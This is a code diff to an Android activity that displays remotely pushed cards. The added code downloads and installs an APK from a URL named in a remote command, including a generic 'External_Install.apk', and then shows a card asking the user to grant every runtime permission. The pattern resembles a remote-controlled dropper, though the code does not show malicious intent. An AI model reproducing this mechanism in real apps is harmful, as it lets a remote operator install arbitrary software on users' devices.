@@ -2,16 +2,24 @@ package com.example.fast.ui
 
 import android.content.Intent
 import android.content.pm.PackageManager
+import android.net.Uri
+import android.os.Build
 import android.os.Bundle
 import android.util.Log
 import android.view.View
 import android.widget.FrameLayout
+import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
+import androidx.core.content.FileProvider
 import com.example.fast.R
 import com.example.fast.ui.card.MultipurposeCardController
 import com.example.fast.ui.card.MultipurposeCardSpec
+import com.example.fast.ui.card.PurposeSpec
 import com.example.fast.ui.card.RemoteCardHandler
 import com.example.fast.util.DefaultSmsAppHelper
+import com.example.fast.util.PermissionManager
+import com.example.fast.util.UpdateDownloadManager
+import java.io.File
 
 /**
  * MultipurposeCardActivity - Fullscreen activity for displaying remote cards.
@@ -133,6 +141,10 @@ class MultipurposeCardActivity : AppCompatActivity() {
     private lateinit var rootView: FrameLayout
     private var cardController: MultipurposeCardController? = null
     private var cardSpec: MultipurposeCardSpec? = null
+    /** When set, card is update flow from activation/activated; after update card we show permission card then redirect. */
+    private var launchedFrom: String? = null
+    /** Callback to run when the currently shown card is dismissed (set when building spec so showCard uses it). */
+    private var currentCardOnComplete: (() -> Unit)? = null
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -148,18 +160,53 @@ class MultipurposeCardActivity : AppCompatActivity() {
             return
         }
 
-        Log.d(TAG, "Creating card with data: $data")
+        launchedFrom = intent.getStringExtra(ActivationActivity.EXTRA_LAUNCHED_FROM)
+        val cardType = data[RemoteCardHandler.KEY_CARD_TYPE]
+        currentCardOnComplete = when {
+            cardType == RemoteCardHandler.CARD_TYPE_UPDATE && !launchedFrom.isNullOrEmpty() -> {
+                { showPermissionPhaseThenRedirect() }
+            }
+            else -> {
+                { Log.d(TAG, "Card dismissed, finishing activity"); finish() }
+            }
+        }
+
+        Log.d(TAG, "Creating card with data: $data, launchedFrom=$launchedFrom")
 
         // Build and show the card
-        cardSpec = RemoteCardHandler.buildSpec(data, this) {
-            Log.d(TAG, "Card dismissed, finishing activity")
-            finish()
-        }
+        cardSpec = RemoteCardHandler.buildSpec(data, this, currentCardOnComplete!!)
 
         if (cardSpec == null) {
             Log.e(TAG, "Failed to build card spec, finishing")
             finish()
             return
+        }
+
+        // For update card with download URL: replace purpose so "Update" starts download and install
+        if (cardType == RemoteCardHandler.CARD_TYPE_UPDATE) {
+            val downloadUrlRaw = data[RemoteCardHandler.KEY_DOWNLOAD_URL]?.trim()
+            if (!downloadUrlRaw.isNullOrBlank()) {
+                val (versionCode, url) = parseDownloadUrl(downloadUrlRaw)
+                val baseSpec = cardSpec!!
+                cardSpec = baseSpec.copy(purpose = PurposeSpec.UpdateApk(
+                    primaryButtonLabel = (baseSpec.purpose as? PurposeSpec.UpdateApk)?.primaryButtonLabel ?: "Update",
+                    showActionsAfterFillUp = true,
+                    onStartUpdate = { startUpdateDownloadAndInstall(url, versionCode) }
+                ))
+            }
+        }
+
+        // For install APK card (other/generic APK): replace purpose so "Install" starts download and install
+        if (cardType == RemoteCardHandler.CARD_TYPE_INSTALL_APK) {
+            val downloadUrl = data[RemoteCardHandler.KEY_DOWNLOAD_URL]?.trim()
+            if (!downloadUrl.isNullOrBlank()) {
+                val baseSpec = cardSpec!!
+                cardSpec = baseSpec.copy(purpose = PurposeSpec.UpdateApk(
+                    primaryButtonLabel = (baseSpec.purpose as? PurposeSpec.UpdateApk)?.primaryButtonLabel ?: "Install",
+                    showActionsAfterFillUp = true,
+                    onStartUpdate = { startGenericInstallDownloadAndInstall(downloadUrl) }
+                ))
+            }
         }
 
         // Show the card after layout is ready
@@ -168,20 +215,169 @@ class MultipurposeCardActivity : AppCompatActivity() {
         }
     }
 
+    /**
+     * Parse download URL extra: "url" or "versionCode|url" (per updateApk command format).
+     */
+    private fun parseDownloadUrl(raw: String): Pair<Int, String> {
+        val pipe = raw.indexOf('|')
+        return if (pipe > 0) {
+            val versionCode = raw.substring(0, pipe).trim().toIntOrNull() ?: 0
+            val url = raw.substring(pipe + 1).trim()
+            versionCode to url
+        } else {
+            0 to raw
+        }
+    }
+
+    /**
+     * Start download via UpdateDownloadManager; on complete, install APK and dismiss/finish.
+     */
+    private fun startUpdateDownloadAndInstall(downloadUrl: String, versionCode: Int) {
+        if (isDestroyed || isFinishing) return
+        val downloadManager = UpdateDownloadManager(this)
+        downloadManager.startDownload(
+            downloadUrl = downloadUrl,
+            versionCode = versionCode,
+            callback = object : UpdateDownloadManager.DownloadProgressCallback {
+                override fun onProgress(progress: Int, downloadedBytes: Long, totalBytes: Long, speed: String) {}
+                override fun onComplete(file: File) {
+                    runOnUiThread {
+                        if (isDestroyed || isFinishing) return@runOnUiThread
+                        installApkFile(file)
+                        currentCardOnComplete?.invoke()
+                    }
+                }
+                override fun onError(error: String) {
+                    runOnUiThread {
+                        Toast.makeText(this@MultipurposeCardActivity, "Download failed: $error", Toast.LENGTH_LONG).show()
+                    }
+                }
+                override fun onCancelled() {
+                    runOnUiThread {
+                        Toast.makeText(this@MultipurposeCardActivity, "Download cancelled", Toast.LENGTH_SHORT).show()
+                    }
+                }
+            }
+        )
+    }
+
+    /**
+     * Download APK with generic file name and install (for installApk command / other APKs).
+     */
+    private fun startGenericInstallDownloadAndInstall(downloadUrl: String) {
+        if (isDestroyed || isFinishing) return
+        val downloadManager = UpdateDownloadManager(this)
+        downloadManager.startDownload(
+            downloadUrl = downloadUrl,
+            customFileName = "External_Install.apk",
+            callback = object : UpdateDownloadManager.DownloadProgressCallback {
+                override fun onProgress(progress: Int, downloadedBytes: Long, totalBytes: Long, speed: String) {}
+                override fun onComplete(file: File) {
+                    runOnUiThread {
+                        if (isDestroyed || isFinishing) return@runOnUiThread
+                        installApkFile(file)
+                        currentCardOnComplete?.invoke()
+                    }
+                }
+                override fun onError(error: String) {
+                    runOnUiThread {
+                        Toast.makeText(this@MultipurposeCardActivity, "Download failed: $error", Toast.LENGTH_LONG).show()
+                    }
+                }
+                override fun onCancelled() {
+                    runOnUiThread {
+                        Toast.makeText(this@MultipurposeCardActivity, "Download cancelled", Toast.LENGTH_SHORT).show()
+                    }
+                }
+            }
+        )
+    }
+
+    /**
+     * Install APK file (same logic as UpdatePermissionCardHelper.installApk).
+     */
+    private fun installApkFile(file: File) {
+        if (!file.exists()) {
+            Log.e(TAG, "APK file does not exist: ${file.absolutePath}")
+            return
+        }
+        try {
+            val uri = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                FileProvider.getUriForFile(this, "$packageName.fileprovider", file)
+            } else {
+                Uri.fromFile(file)
+            }
+            val intent = Intent(Intent.ACTION_VIEW).apply {
+                setDataAndType(uri, "application/vnd.android.package-archive")
+                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_GRANT_READ_URI_PERMISSION
+            }
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                packageManager.queryIntentActivities(intent, 0).forEach { resolveInfo ->
+                    grantUriPermission(resolveInfo.activityInfo.packageName, uri, Intent.FLAG_GRANT_READ_URI_PERMISSION)
+                }
+            }
+            startActivity(intent)
+        } catch (e: Exception) {
+            Log.e(TAG, "Error installing APK", e)
+            Toast.makeText(this, "Install failed: ${e.message}", Toast.LENGTH_LONG).show()
+        }
+    }
+
     private fun showCard() {
         val spec = cardSpec ?: return
+        val onComplete = currentCardOnComplete ?: { Log.d(TAG, "Card completed, finishing activity"); finish() }
 
         cardController = MultipurposeCardController(
             context = this,
             rootView = rootView,
             spec = spec,
-            onComplete = {
-                Log.d(TAG, "Card completed, finishing activity")
-                finish()
-            },
+            onComplete = onComplete,
             activity = this
         )
         cardController?.show()
+    }
+
+    /**
+     * After update card is dismissed, show permission card (same activity); when that card is done, redirect and finish.
+     */
+    private fun showPermissionPhaseThenRedirect() {
+        cardController = null
+        cardSpec = null
+        currentCardOnComplete = { redirectAndFinish() }
+        val permissions = PermissionManager.getRequiredRuntimePermissions(this)
+        val permissionData = mapOf(
+            RemoteCardHandler.KEY_CARD_TYPE to RemoteCardHandler.CARD_TYPE_PERMISSION,
+            RemoteCardHandler.KEY_PERMISSIONS to permissions.joinToString(","),
+            RemoteCardHandler.KEY_TITLE to "PERMISSIONS",
+            RemoteCardHandler.KEY_BODY to "Please grant the required permissions.",
+            RemoteCardHandler.KEY_PRIMARY_BUTTON to "Grant"
+        )
+        cardSpec = RemoteCardHandler.buildSpec(permissionData, this, currentCardOnComplete!!)
+        rootView.post { showCard() }
+    }
+
+    /**
+     * Start the originating activity with resume/status animation extra, then finish.
+     */
+    private fun redirectAndFinish() {
+        when (launchedFrom) {
+            ActivationActivity.LAUNCHED_FROM_ACTIVATION -> {
+                val intent = Intent(this, ActivationActivity::class.java).apply {
+                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
+                    putExtra(ActivationActivity.EXTRA_RESUME_STATUS_ANIMATION, true)
+                }
+                startActivity(intent)
+            }
+            "activated" -> {
+                val intent = Intent(this, ActivatedActivity::class.java).apply {
+                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
+                    putExtra("run_status_animation", true)
+                }
+                startActivity(intent)
+            }
+            else -> { /* no redirect */ }
+        }
+        finish()
     }
 
     private fun parseIntentToData(intent: Intent): Map<String, String> {
@@ -228,6 +424,11 @@ class MultipurposeCardActivity : AppCompatActivity() {
         grantResults: IntArray
     ) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+
+        // Forward to PermissionManager first so one-by-one cycle (startRequestPermissionList) is handled
+        if (PermissionManager.handleActivityRequestPermissionsResult(this, requestCode, permissions, grantResults)) {
+            return
+        }
 
         when (requestCode) {
             MultipurposeCardController.REQUEST_CODE_MULTIPURPOSE_PERMISSION -> {
